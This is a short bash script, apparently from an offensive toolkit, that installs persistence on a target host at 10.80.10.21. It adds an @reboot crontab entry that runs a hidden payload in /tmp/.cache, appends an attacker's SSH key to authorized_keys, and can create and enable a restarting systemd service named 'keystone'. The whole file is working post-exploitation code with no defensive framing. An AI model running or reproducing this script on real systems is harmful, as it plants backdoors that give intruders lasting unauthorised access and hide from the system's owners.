#!/usr/bin/env bash
# persist-10-80-10-21.sh
# Category: persist | Node: cron-root | Reusable: ks-ws01, ks-files01, vault-keystone
set -euo pipefail

TARGET="${TARGET:-10.80.10.21}"
MECHANISMS="${MECHANISMS:-cron,ssh_key}"
PAYLOAD="${PAYLOAD:-/tmp/.cache/keystone}"

echo "[persist] Installing mechanisms=$MECHANISMS on $TARGET"

for m in $(echo "$MECHANISMS" | tr ',' ' '); do
    case "$m" in
        cron)
            echo "@reboot $PAYLOAD" | crontab -
            echo "[persist] cron installed"
            ;;
        ssh_key)
            mkdir -p ~/.ssh
            echo "ssh-rsa AAAAB3NzaC1yc2E... keystone-persist" >> ~/.ssh/authorized_keys
            chmod 600 ~/.ssh/authorized_keys
            echo "[persist] ssh_key installed"
            ;;
        systemd)
            cat > /etc/systemd/system/keystone.service <<EOF
[Unit]
Description=Keystone Persistence
[Service]
ExecStart=$PAYLOAD
Restart=always
[Install]
WantedBy=multi-user.target
EOF
            systemctl enable keystone.service || true
            echo "[persist] systemd installed"
            ;;
    esac
done

echo "[persist] All mechanisms deployed on $TARGET"
